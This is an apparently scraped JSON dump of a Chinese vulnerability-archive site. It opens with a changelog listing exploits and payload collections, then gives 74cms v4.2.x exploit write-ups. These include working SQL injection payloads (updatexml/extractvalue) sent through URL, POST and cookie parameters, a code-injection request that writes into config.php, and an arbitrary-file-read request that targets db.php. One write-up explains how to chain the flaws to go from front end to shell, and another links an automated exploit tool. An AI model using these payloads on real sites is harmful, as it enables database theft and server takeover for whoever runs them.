{"./":{"url":"./","title":"主页","keywords":"","body":"零组资料文库 用业余时间将2018-2019年互联网上所公开漏洞都进行了汇总并进行免费公开，后面会每周定时更新库存。如果您对我们的网站有什么建议，或者您发现我们没有收录到某些poc，希望您能联系我们进行补充修复。 联系邮箱ian@lcx.cc Ps：左侧的窗口栏可以自行伸展开，另外背景的色彩也可以自行设置。 零组资料文库项目交流群：345372491 网站中所涉及技术和工具等只供学习交流使用，不得用于实施违反法律活动，否则后果将由实施人承担。 本网站作品采用知识共享署名 4.0 国际许可协议进行许可。禁止使用非法爬虫形式，将本网站搭建到公网上！！！ 更新日志 2.20 （2019-12-16) 新增 【漏洞库】 74cms 74cms v5.0.1远程执行代码 JYmusic JYmusic 1.x 版本 前台getshell JYmusic 2.0 前台XSS漏洞 JYmusic 2.0 命令执行漏洞 Ueditor 百度ueditor编辑器 xss漏洞 【iot】 默认设备密码 感谢@友人A 师傅对部分文章的投稿 感谢@毒刺 师傅对部分文章的投稿 2.19 （2019-12-16) 新增 【漏洞库】 Apache （CVE-2017-15715）Apache解析漏洞 Maccms Maccms后门 Webmin （CVE-2019-15107）Webmin 远程命令执行漏洞 微擎 微擎 绕过禁用函数写shell 微擎 后台getshell 微擎 低权限后台getshell优化 增加一键复制代码功能 增加自动跳回顶部功能 增加图片点击可放大功能 修复（CVE-2016-3088）ActiveMQ应用漏洞 图片太小导致访问不便的问题 修复 weblogic爆破 图片太小导致访问不便的问题 感谢@福林表哥 师傅对部分文章的投稿 感谢@天乐 师傅赞助的cdn 2.18 （2019-12-15) 本次更新迫不得已增加页面底部印记，全站图片增加水印。 没有说不能爬下来使用，但是麻烦哪些爬下来的请不要搭建到公网上，打包成pdf的注明来源 好自为之 2.17 （2019-12-14) 新增 【漏洞库】 CatfishCMS CatfishCMS 4.5.7 xss CatfishCMS 4.5.7 csrf getshell CatfishCMS 4.6.15 后台文件包含getshell CatfishCMS 4.6.15 csrf getshel Discuz Discuz! X系列全版本后台Sql注入漏洞 Eyoucms Eyoucms 1.4.2 sql注入 FastJson Fastjson Fastjson Mintinstall （CVE-2019-17080）Mintinstall object injection Weblogic （CVE-2019-2890） Weblogic T3 Analysis 【tools】 Burpsuit Burpsuit 伪造ip爆破脚本 2.16 （2019-12-10) 优化 对网站的搜索功能进行了修改，现已支持全文搜索。 对网站的部分目录进行优化 新增 【漏洞库】 CatfishCMS CatfishCMS 4.6.15 前台xss Flash Flash钓鱼源码 IonizeCMS （CVE-2017-5961）IonizeCMS xss IonizeCMS sql注入 Wordpress （CVE-2019-19133）WordPress CSS Hero 4.0.3 反射xss UsualToolcms UsualToolcms 8.0 系统重装漏洞 UsualToolcms 8.0 前台任意文件删除 UsualToolcms 8.0 绕过后台验证码爆破 UsualToolcms 8.0 后台GETSHELL UsualToolcms 8.0 后台盲注 UsualToolcms 8.0 前台sql 通达oa 通达oa 2011-2013 通杀GETSHELL （WooYun-2014-82678）通达oa 未授权获取帐号 通达oa XFF导致日志混淆 通达oa ⻚面敏感信息泄露 通达oa 任意账号跳转 通达oa 文件包含漏洞 通达oa sql注入 通达oa xss 通达oa 越权访问 通达oa 数据库脚本导⼊getshell 通达oa 通达oa 任意⽂件上传漏洞 通达oa 11.2后台getshell 【tools】 浏览器插件 Set Character Encoding 感谢@福林表哥 师傅对部分文章的投稿 2.15 （2019-12-3) 新增 【漏洞库】 Finecms Finecms 5.0.10多重漏洞 （CVE-2018-6893）Finecms SQL注入漏洞 Google （CVE-2019-5786）Chrome 远程代码执行漏洞 Jenkins Jenkins功能未授权访问导致的远程命令执行漏洞 YXcms YXcmsApp 1.4.3任意用户密码重置漏洞 YXCMS 1.4.7储存型xss YXCMS 1.4.7任意文件删除 YXCMS 1.4.7任意文件写入 YXCMS 1.4.7SQL注入 （CVE-2018-11003）YXcms 1.4.7跨站请求伪造漏洞 【补充】 Phpmyadmin （CVE-2018-12613）phpmyadmin远程文件包含漏洞 感谢@友人A 师傅对（CVE-2018-12613）phpmyadmin远程文件包含漏洞作出的补充说明 感谢@福林表哥 师傅对部分文章的投稿 感谢@毒刺 师傅对部分文章的投稿 2.14 （2019-11-30) 新增 【漏洞库】 Dedecms Dedecms找后台 Dedecms swf文件反射型xss 【开启会员注册】（CVE-2018-20129）Dedecms前台文件上传漏洞 【开启会员注册】（SSV-97074）DeDecms 前台任意用户密码修改 【开启会员注册】（SSV-97087）DeDecms 任意用户登录 （CNVD-2018-01221）DedeCMS V5.7 SP2存在代码执行漏洞 （CVE-2018-9175）Dedecms V5.7后台的两处getshell （CVE-2019-8362）dedecms v5.7 sp2 后台文件上传 getshell Gitbook （CVE-2017-15688）Gitbook任意文件读取 Maccms Maccms8.x(苹果cms)命令执行漏洞 （CVE-2019-9829）Maccms背景任意文件写入getshell Seacms Seacms V8.7版本SQL注入 Seacms Seacms9.92越权+Getshell Zzcms zzcms2018最新版重装getshell （CVE-2018-13056）Zzcms 任意文件删除 （CVE-2018-14961）Zzcms 前台sql注入 （CVE-2018-14963）Zzcms csrf （CVE-2018-14962）Zzcms储存型xss 禅知 禅知Pro 1.6 前台任意文件读取 禅知后台getshell 【Tools】 浏览器插件 Cookie-Editor Hackbar Swichsharp User-Agent Switcher XssSniper 【修改】 鲶鱼cms代码执行 感谢@友人A 师傅提出的鲶鱼cms中的错误 2.13 （2019-11-28) 新增 【团队介绍页面】 【漏洞库】 CatfishCMS CatfishCMS后台csrf CatfishCMS后台储存型xss CatfishCMS远程命令执行 Phpmyadmin （CVE-2018-12613）phpmyadmin远程文件包含漏洞 ActiveMQ （CVE-2016-3088）ActiveMQ应用漏洞 【sql】 sqlmap tamper sqlmap bypass 安全狗 tamper 感谢@Ascotbe 师傅分享的部分文章 2.12 （2019-11-27) 新增 【漏洞库】 Apache Apache Flink Dashboard 未授权访问-远程代码命令执行 GetSimple CMS （CVE-2019-11231）GetSimple CMS 远程命令执行 SeaCMS 海洋CMS V6.28远程代码执行 海洋CMS V6.45远程代码执行 海洋CMS V6.54远程代码执行 海洋CMS V6.55远程代码执行 【内网渗透】 利用windows api dump进程 【sql】 sqlmap sqlmap参数说明 sql注入payloads 通用SQL注入Payloads 常规 Error Based Payloads 通用 Time Based SQL Injection Payloads 通用 Union Select Payloads SQL注入 Auth Bypass Payloads 感谢@Ascotbe 师傅分享的部分文章 2.11 （2019-11-25) 新增 【漏洞库】 Wordpress （CVE-2019-17671）Wordpress未授权访问 Seacms Seacms储存型xss Seacms getshell OpenSNS OpenSNS sql注入 OpenSNS 后台getshell Niushop Niushop sql注入 Django （CVE-2019-14234）Django JSONField SQL注入 Newbee-mall （CVE-2019-19113）新蜂商城sql注入 R&D Visions CMS R&D Visions CMS SQL Injection Xfilesharing （CVE-2019-18951）Xfilesharing 2.5.1本地文件上传getshell （CVE-2019-18952）Xfilesharing 2.5.1本地文件包含 【提权exp】 win CVE-2019-1405 【iot】 PHICOMM （CVE-2019-19117）PHICOMM 远程代码执行 感谢@Puppy。 师傅分享的CVE-2019-1405 2.10 （2019-11-22) 新增 sql Tor-IP-Changer实现Sqlmap自动切换代理IP Sqlmap rps脚本 禅道 禅道8.2-9.2.1注入GetShell Eyoucms Eyoucms1.0前台getshell THINKCMF THINKCMFX_2.2.3漏洞合集 MetInfo MetInfo系统中一处旧插件导致的ssrf Metinfo 6.1.2 SQL注入 MetInfo 任意文件读取 PbootCMS PbootCMS sql 注入 PbootCMS csrf 74cms 新版74cms v4.2.1-v4.2.129-后台getshell漏洞 新版74cms v4.2.126-前台四处sql注入 新版74cms v4.2.126-任意文件读取漏洞 新版74cms v4.2.126-通杀sql注入 新版74cms v4.2.126-因任意文件读取漏洞导致的任意用户密码修改漏洞 内网渗透 内网渗透之获取windows远程桌面（RDP）连接记录 补充 vBulletin （CVE-2019-16759）vBulletin 5.x 0day pre-auth RCE exploit 2.09 （2019-11-20） 新增 Php PHP序列化和反序列化语法差异问题 Apache （CVE-2019-0193）Apache Solr 远程命令执行漏洞 上传绕过 user_ini的利用 修复 修复了win.zip不能下载的问题 2.08 （2019-11-19） 新增 YouPHPTube-Encoder （CVE-2019-5127 / CVE-2019-5128 / CVE-2019-5129）YouPHPTube-Encoder 2.3 多个远程代码执行漏洞 Computrols CBAS Web （CVE-2019-10846）Computrols CBAS Web反射型xss （CVE-2019-10848）Computrols CBAS Web 用户名枚举 （CVE-2019-10852）Computrols CBAS Web SQL注入 Weblogic (CVE-2019-2618) 移动安全 SpyNote5.0客户端APK逆向分析 sql sqlmap tamper速查梳理 提权exp CVE-2019-1405/CVE-2019-1322 感谢@毒刺 师傅分享的Weblogic 感谢@Mannix 师傅发现了排版的错误 2.07 （2019-11-13） 新增 Apache Flink Dashboard 未授权访问-远程代码命令执行 Gitlab wiki 储存型xss （CVE-2019-16662）rConfig远程命令执行Coremail Coremail配置文件信息泄漏 JCG路由器命令执行漏洞 eyoucms 1.3.9上传漏洞 （CVE-2019-7609）kibana原型链污染导致的RCE 感谢@毒刺 师傅投稿的JCG路由器命令执行漏洞 2.06 （2019-11-8） 更正 D-Link DIR-823G(CVE-2019-15529)不能访问的问题 ActiveMQ排版顺序出错的问题 感谢@chacha 师傅的提醒，更正了ActiveMQ的排版顺序问题 2.05 （2019-11-7） 本次更新请各位师傅们清除一下本网站的缓存！！！ 本次更新请各位师傅们清除一下本网站的缓存！！！ 本次更新请各位师傅们清除一下本网站的缓存！！！ 新增 win提权exp win提权exp辅助脚本 linux提权exp IOT D-Link DIR-823G(CVE-2019-15529) 感谢@毒刺 师傅发现了windows提权exp不能下载的问题 2.04 （2019-11-6） 新增 ActiveMQ ActiveMQ物理路径泄漏漏洞 （CVE-2016-3088）ActiveMQ应用漏洞 （CVE-2017-15709）ActiveMQ 信息泄漏漏洞 内网穿透 ew lcx nc reGeorg ewssocks teamviewer 内网渗透 bypass 金山毒霸 DBscanner windows常用程序密码读取工具 IOT (CVE-2019-13128)D-Link DIR-823G命令注入漏洞 常用命令 sql server常用操作远程桌面命令 msfvenom常用生成payload命令 感谢@っ、Emotional 师傅投稿的ActiveMQ部分文章 2.03 （2019-11-5） 新增 Weblogic Weblogic爆破 （CVE-2017-3248） （CVE-2017-3506） （CVE-2017-10271） （CVE-2018-2628） （CVE-2018-2893） （CVE-2018-2894） （CVE-2018-3191） （CVE-2018-3245） （CVE-2019-2725）（CNVD-C-2019-48814） 上传绕过 上传绕过总结 常用命令 基础网络命令 路由常用命令 域操作命令 Dos快捷命令 Windows端口转发 Powershell基础命令 Powershell常用命令 Powershell注册表操作 Powershell操作注册表权限 修复 修复目录的数字显示，让阅读变得更加便捷。 感谢@毒刺 师傅提供的部分Weblogic的漏洞 感谢@っ、Emotional 师傅投稿的Weblogic部分文章 感谢@牙疼吃糖 师傅的提示，更正了Weblogic的错误 2.02 （2019-11-5） 新增 php php mt_rand函数的安全问题探讨 sql sqlmap sqlmap udf提权过程 sqlmap udf提权原理 sqlmap os-shell提权过程 sqlmap tamper bypass d盾tamper bypass 云锁tamper sql提权手工辅助 UDF手工提权辅助 MOF手工提权辅助 S A手工提权辅助 sqlmap+burp辅助批量注入验证 SleuthQL工具 2.01 （2019-11-4） 新增 Wordpress WordPress Google Review Slider 6.1 SQL Injection （从xss到getshell） xss的深层次利用与探讨 （CVE-2017-6514）敏感信息泄漏 （CVE-2019-16219）内置编辑器Gutenberg 储存型xss （CVE-2019-16520）WordPress Plugin - All in One SEO Pack 储存型xss （CVE-2019-16522）WordPress Plugin - EU Cookie Law (GDPR) 储存型xss （CVE-2019-16523）WordPress Plugin - Events Manager 储存型xss （CVE-2019-8943）WordPress 5.0.0 - Crop-image Shell Upload (Metasploit) 致远oa 致远oa命令执行 更正 Apache 中的错别字 Discuz 文中的漏洞影响范围 感谢@夕颜 @Space 师傅指出问题，我们已经及时更正。 感谢@毒刺 师傅的提醒，我们增加了致远oa命令执行的文章 2.0 （2019-11-4） 更换新的框架 增加搜索功能 完善0day库，后续将陆续增加之前的库存 1.0 （2019-10-31） 新增 Apache Nexus Smarty ThinkPHP ThinkCMF Apache Tomcat WordPress 修复 修复手机端无法显示菜单列表 修复Apache，Smarty文章内图片显示错误 优化 优化页面效果，提升页面流畅度 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 19:56:30 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/新版74cms v4.2.1-v4.2.129-后台getshell漏洞.html":{"url":"0day/74cms/新版74cms v4.2.1-v4.2.129-后台getshell漏洞.html","title":"74cms v4.2.1-v4.2.129-后台getshell漏洞","keywords":"","body":"74cms v4.2.1-v4.2.129-后台getshell漏洞 0x00 前言 厂商：74cms 下载地址：http://www.74cms.com/download/index.html 关于版本： 新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包) 2， 将下载好的包进行安装 3， 进入后台点击查看如果不是最新版的话，请点击升级！ 4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决 5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php 6， 查找所有$_SERVER['HTTP_HOST'] 改为 http://baidu.com 即可 0x02漏洞演示 url: http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),' shell:http://74cms.test/Application/Home/Conf/config.php 路径：\\74cms\\upload\\Application\\Home\\Conf\\config.php 0x03 漏洞原理 url: http://74cms.test/index.php?m=Admin&c=Tpl&a=set&tpl_dir= ', 'a',phpinfo(),' 路径：74cms\\upload\\Application\\Admin\\Controller\\TplController.class.php 路径： 74cms\\upload\\Application\\Common\\Controller\\BackendController.class.php 0x04题外话-认真版getshell方法 认真版getshell方法： 实际上想要进行getshell利用组合漏洞是很简单的事情。我的前台日到后台的getshell方法是这样的。 首先利用-任意文件读取漏洞-读取系统中的hash值 然后在通过漏洞-前台sql注入-来插入用户数据-因为我发现他可以支持执行双语句所以可以执行mysql双语句插入一条管理员用户 在通过这个后台getshell漏洞 即可完成一套日穿 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/wecilm 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 10:56:52 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/新版74cms v4.2.126-前台四处sql注入.html":{"url":"0day/74cms/新版74cms v4.2.126-前台四处sql注入.html","title":"74cms v4.2.126-前台四处sql注入","keywords":"","body":"74cms v4.2.126-前台四处sql注入 0x00 前言 厂商：74cms 下载地址：http://www.74cms.com/download/index.html 关于版本： 新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包) 2， 将下载好的包进行安装 3， 进入后台点击查看如果不是最新版的话，请点击升级！ 4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决 5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php 6， 查找所有$_SERVER['HTTP_HOST'] 改为 http://baidu.com 即可 0x02 概要 这个注入也是挺有趣的，如果不是我有比对源码的习惯的话，可能还找不到这个74cms独有的框架sql注入漏洞 : ) 这里我并不会脱离74cms重新讲一次相关的框架内容，所以读者最好，看看我之前的文章。 ThinkPHP3.2.3框架实现安全数据库操作分析 https://www.yuque.com/pmiaowu/bfgkkh/coglz1 先看完上面的文章，然后在看此文章，会更简单的了解清楚。 0x03 漏洞讲解 非常抱歉，让读者看到前面 3节 不是很有营养的东西。 在前面最开始的时候，我说过我有对比源码，使用手册的情况。 所以这里我们继续在开始之前，我要使用在74cms这个代码里面写个例子，希望可以让你们看懂，因为文化水平不高=-=，写文章感觉和很多前辈差距挺大的。 为了能够更直观，这里开启调试 文件：74cms\\upload\\Application\\Common\\Conf\\config.php 添加多一行 'SHOW_PAGE_TRACE' => true, 然后打开文件：74cms\\upload\\Application\\Home\\Controller\\IndexController.class.php 添加代码： $uid = I('GET.uid'); M('CompanyProfile')->field('companyname,logo')->where(array('uid'=>$uid))->find(); 我感觉到这里可能有人要骂我了。 应该有人会： 你个瓜皮，你家审计可以自己加代码的？ 是的是的，的却不能加。我这样也是想让更多的人能够简单的看懂这个漏洞 那么我们通过这个也能知道一般这种情况，是没得注入的了，而且应为使用了系统函数 I 所以也是没有框架注入这一说。 这里又要重新重复讲解I函数的作用了 在我的眼中I函数就是一个为了解决框架底层设计问题的函数 神奇的I函数 路径:ThinkPHP\\Common\\functions.php 方法名：function I($name,$default='',$filter=null,$datas=null) 这个函数的主要功能为3个 1， 确定数据类型 2， 对数据进行循环取值 3， 调用think_filter 函数进行过滤 think_filter函数分析 例如： 没有使用think_filter 函数时 goods_name[0]=in&goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&goods_name[2]=exp 使用了think_filter函数时 goods_name[0]=in &goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&goods_name[2]=exp 注意：使用了think_filter函数时 in后面是有空格的也就是说返回值是 goods_name[0]=in(空格)&goods_name[1]=(true) and (updatexml(1,concat(1,(select user())),1))--&goods_name[2]=exp 而正是这个空格的问题，就可以修复掉可能发生的框架注入问题。 接着我们直接打开文件：74cms\\upload\\ThinkPHP\\Library\\Think\\Db\\Driver.class.php think_filter函数与上图两者对比一下，是否发现多点了东西？ 是的没错了。 74cms 修改了tp底层添加了 3个新方法： match match_mode match_with 也就是说这3个方法我们是可以绕过 I 函数的过滤的 接着查看：parseWhereItem( 方法 使用的是直接字符串拼接的方式入库，故判断此漏洞可利用. 注意了上图我们可控制的点是 $str 而 $str 给双引号包含！！！！！！！ 最开始的时候，记得我说过么，系统默认I 会过滤 “双引号” 而导致此注入不可用，那么就需要找一处不经过I函数或是说不过滤双引号的地方来构造漏洞。 这里我们重新修改一下例子： 打开文件： 74cms\\upload\\Application\\Home\\Controller\\IndexController.class.php 输入url: http://74cms.test/index.php?m=Home&c=index&a=index&uid[0]=match&uid[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) – a 这样的话，这个注入就是可用的了。理解了这个以后，我们也算是挖到了74cms独有的框架漏洞。 接下来整理一下会发生注入的情况 M()->where($test)->xx 那么只要 where中任意参数可控，并不会过滤 双引号即可！ 然后就没什么技术含量了使用ide进行搜索测试即可确定漏洞，经过一顿搜索以后 前端发现一共有四处，也就是说这个框架漏洞，可以利用的地方只有四处。 后端注入，除了挖src，不然我都认为他是没有什么用。所以后端能不能利用我也不知道。我没去看 : ) 0x04 74cms独有框架漏洞第一处 文件：74cms\\upload\\Application\\Home\\Controller\\AjaxPersonalController.class.php 方法：function company_focus($company_id) 是否需登录：需要 登录权限：普通用户即可 为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。 登录后台 注册完成以后登录前台即可 如果不登录的话，会显示这个样子 url:http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) -- a 看源码 打开文件： 74cms\\upload\\Application\\Common\\Model\\PersonalFocusCompanyModel.class.php 方法：add_focus( 0x05 74cms独有框架漏洞第二处 文件：74cms\\upload\\Application\\Home\\Controller\\CompanyServiceController.class.php 方法：order_pay_finish( 是否需登录：需要 登录权限：企业用户即可 看源码 为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。 注册完成以后登录前台即可 url: http://74cms.test/index.php?m=&c=CompanyService&a=order_pay_finish&order_id[0]=match&order_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) -- a 如果不登录的话，会显示这个样子 url:http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus http://74cms.test/index.php?m=&c=AjaxPersonal&a=company_focus&company_id[0]=match&company_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) -- a 看源码 打开文件： 74cms\\upload\\Application\\Common\\Model\\PersonalFocusCompanyModel.class.php 方法：add_focus( 0x06 74cms独有框架漏洞第二处 文件：74cms\\upload\\Application\\Home\\Controller\\CompanyServiceController.class.php 方法：order_pay_finish( 是否需登录：需要 登录权限：企业用户即可 看源码 为了方便，我是直接后台注册账户的，因为本人穷，付不起短信费。 注册完成以后登录前台即可 url: http://74cms.test/index.php?m=&c=CompanyService&a=order_pay_finish&order_id[0]=match&order_id[1][0]=aaaaaaa\") and updatexml(1,concat(0x7e,(select user())),0) – a 0x07 74cms独有框架漏洞第三处 文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php 方法：register( 是否需登录：不需要 url: http://74cms.test/index.php?m=&c=Members&a=register post: reg_type=2&utype=2&ucenter=bind&unbind_mobile=1 cookie: members_uc_info[reg_type]=1;members_uc_info[utype]=2;members_uc_info[mobile][0]=match;members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a; headers: Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest 这里我要大概讲一下参数的问题 post: reg_type=2 // 必须为2 为了绕过一个注册判断，为1的话，会直接创建帐户，导致无法利用漏洞 utype=2 // 判断会员类型的也必须为2 为1会直接创建一条数据，导致无法利用漏洞 ucenter=bind // 必须为bind因为要靠他，获取cookie(members_uc_info)并且合并为$data数组进行利用 unbind_mobile=1 // 只要有此字段即可，只是单纯为了满足流程判断的 cookie: members_uc_info[reg_type]=1; // 必须为1 满足流程需要 members_uc_info[utype]=2; // 必须为2 满足流程需要 members_uc_info[mobile][0]=match; // 框架漏洞利用 members_uc_info[mobile][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a; // 这里输入注入语句 headers: // 伪造ajax操作 Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest 0x07 74cms独有框架漏洞第四处 文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php 方法：oauth_reg ( 是否需登录：需要 登录权限：普通用户/企业用户都可 url: http://74cms.test/index.php?m=&c=Members&a=oauth_reg post: username = 自己去平台随便注册个账号然后输入那个账号 password = 自己去平台随便注册个账号然后输入那个密码 cookie: members_bind_info[type][0]=match; members_bind_info[type][1][0]=aaaaaaa%22) and updatexml(1,concat(0x7e,(select user())),0) -- a; 看源码 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/nzr6fl 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 10:56:56 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/新版74cms v4.2.126-任意文件读取漏洞.html":{"url":"0day/74cms/新版74cms v4.2.126-任意文件读取漏洞.html","title":"74cms v4.2.126-任意文件读取漏洞","keywords":"","body":"74cms v4.2.126-任意文件读取漏洞 0x00 前言 厂商：74cms 下载地址：http://www.74cms.com/download/index.html 关于版本： 新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包) 2， 将下载好的包进行安装 3， 进入后台点击查看如果不是最新版的话，请点击升级！ 4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决 5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php 6， 查找所有$_SERVER['HTTP_HOST'] 改为 http://baidu.com 即可 0x02 任意文件读取漏洞演示 url: http://74cms.test/index.php?m=Home&c=Members&a=register post: reg_type=2&utype=2&org=bind&ucenter=bind cookie: members_bind_info[temp_avatar]=../../../../Application/Common/Conf/db.php;members_bind_info[type]=qq;members_uc_info[password]=123456;members_uc_info[uid]=1;members_uc_info[username]=tttttt; headers: Content-Type: application/x-www-form-urlencoded X-Requested-With: XMLHttpRequest 问题一：漏洞原理？ 我下面会讲 问题二：你如何知道文件名称的？ 我下面会讲 问题三：能不能写个简单的工具，自动利用此漏洞？ 哦，好的，我下面会提供 : ) 0x03 漏洞讲解 打开文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php 函数：_save_avatar($avatar, $uid) 如果不想看图片注释的话，我这里简单的说一下。 812行使用$avatar拼接形成$path 830行使用了$save_avatar+$savePicName; 生成了$filename 838行，使用了copy函数，把$path文件内容复制到了$filename中。 而 $avatar 和 $uid 都是我们刚好可以控制的变量 并且生成的文件名称是$uid+time() 然后md5 一下 拼接 .jpg 这个情况就很舒服了。写个小工具跑一下就好了，小工具会在结尾的时候放出来的。 好了，让我们继续看下去 : ) 我们现在既然已经知道了_save_avatar 函数是有可能造成此漏洞的那么这时，我们就需要去找调用它的地方了。 经过一顿的搜索我们得出了两个地方是调用了他 地方一：register() 方法 会员注册方法 地方二：oauth_reg() 方法 第三方登录注册方法 论此漏洞的利用当然是register() 方法利用起来比较简单 因为 方法二 需要搭建第三方登录，我本地的话。。。还是算了，这里掩饰我使用 方法一 打开文件：74cms\\upload\\Application\\Home\\Controller\\MembersController.class.php 函数：register() 上面的马赛克是因为我写错了几个字，又不想重新写，所以我就把他擦掉了。 皮这一下，我就很开心 这里我们讲解一下如果 post的变量ucenter为bind时，则通过cookie获取数组$uc_user 接着会进行数组合并而members_uc_info的cookie值是可控的，所以$data也是可控的。 这里写着 当 $data[utype] = 1 会进行用户注册，而$data[utype]是我们可以控制的所以我们为2绕过此判断 这里我又跳过了前面一些无关紧要的内容，来到了最后的漏洞触发点。因为真的无关紧要,所以就跳过了 0x04 漏洞利用小工具 https://github.com/ianxtianxt/74cms-upload 四、参考链接 https://www.yuque.com/pmiaowu/bfgkkh/dr895b 零组资料文库 all right reserved，powered by Gitbook未经授权禁止转载 2019-12-16 10:57:01 console.log(\"plugin-popup....\");document.onclick = function(e){ e.target.tagName === \"IMG\" && window.open(e.target.src,e.target.src)}img{cursor:pointer}"},"0day/74cms/新版74cms v4.2.126-通杀sql注入.html":{"url":"0day/74cms/新版74cms v4.2.126-通杀sql注入.html","title":"74cms v4.2.126-通杀sql注入","keywords":"","body":"74cms v4.2.126-通杀sql注入 0x00 前言 厂商：74cms下载地址：http://www.74cms.com/download/index.html 关于版本：新版的74cms采用了tp3.2.3重构了，所以可知底层是tp，74cms新版升级是后台升级的，所以先将将升级方法。 注：此漏洞不用升级至最新版本也可使用。 0x01 74cms升级到最新版 1， 先去官网下载 骑士人才系统基础版(安装包)2， 将下载好的包进行安装3， 进入后台点击查看如果不是最新版的话，请点击升级！4， 如果是本地环境的话，会提示 域名不合法升级失败，这个问题很好解决5， 搜索文件74cms\\upload\\Application\\Admin\\Controller\\ApplyController.class.php6， 查找所有$_SERVER['HTTP_HOST'] 改为 http://baidu.com 即可 0x02 数据填充不然没得测试 注：这个漏洞需要在有职位数据的情况下，才能利用。正式环境中，因为都是有数据的所以直接注入即可。不过因为我们是测试环境所以需要我们自己添加一些数据来保证网站的正常运行2 0x02.1注册商家账号方便测试 首先先注册一个商家用户然后发布一条消息，注册商家直接去后台注册最简单了注册完成以后将此商家用户登录前台 登录完毕以后跳转到：http://74cms.test/index.php?m=&c=company&a=com_info设置商家信息然后跳转到：http://74cms.test/index.php?m=&c=Company&a=jobs_add随便发布一条工作消息即可 0x02.2注册普通账号方便测试 一样的前台注册需要短信，我穷，付不起短信费注册完成以后登录前台即可注：一定要登录，因为数据量太少，不登录，过不去验证 0x03 sql漏洞演示 然后输入地址：http://74cms.test/index.php?m=&c=jobs&a=jobs_list&lat=23.176465&range=20&lng=113.35038'注：x，y 不超过 1即可详情页new BMap.Point 搜索出来的值就是 x，y 值 可能上面的内容有人会觉得奇怪，就是这个url实战中你是怎么获得的？其实你可以这样。 这样的话只要点击完以后有数据 你在 lat lng 字段都可以正常的进行注入 Payload: http://74cms.test/index.php?m=&c=jobs&a=jobs_list&lat=23.176465&range=20&lng=113.35038 PI() / 180 - map_x PI() / 180) / 2),2))) * 1000) AS map_range FROM qs_jobs_search j WHERE (extractvalue (1,concat(0x7e,(SELECT USER()), 0x7e))) -- a 剩下的自己注 :) 0x04 漏洞原理 老样子一步步分析吧。先从地址开始分析地址：http://74cms.test/index.php?m=&c=jobs&a=jobs_list典型的mvc结构m 层可以看到为空，我们可以打开目录74cms\\upload\\Application\\Common\\Conf\\config.php 查看DEFAULT_MODULE 参数因此可以确定M = homeC = jobsA = jobs_list 翻译一下的意思就是 Home 目录 下面的jobs 文件里面的jobs_list 方法跟进去 跟进来以后，发现我们的lng 参数并没有在jobs_list 方法，但是在外部的时候的却是这个类。这是因为74cms 使用了 thinkphp 的 tag 也就是标签库驱动 。所以我们在这里并没有看到相关的代码快，因为他是直接嵌了V层中执行也就是我们常说的视图层。想了解这一块的上官网下载thinkphp3.2手册 搜索tag即可获得详细信息 跟进视图层进行查看 找到了视图文件：74cms\\upload\\Application\\Home\\View\\default\\Jobs\\jobs_list.html 根据图中的条件可得知具体目录名为74cms\\upload\\Application\\Common\\qscmstag\\jobs_listTag.class.php 说明我们的猜想是没有错的。 为了不浪费大家的时间，我就尽量选重点讲，避免浪费大家时间!这里我们需要了解一下。 首先是我们可外部控制的值 所以最终我们符合条件的内容都会赋值为$this->params 知道这个接口，我们继续注入点，因为前面的东西有太多和我们的这个注入无关的东西了所以我们忽略掉我上图中还圈出来的第二个圈圈，可以看到 $this->params[lat] 与 $this->params[lng] 赋值并且没有过滤给了$this->field 而大部分的php框架在 field 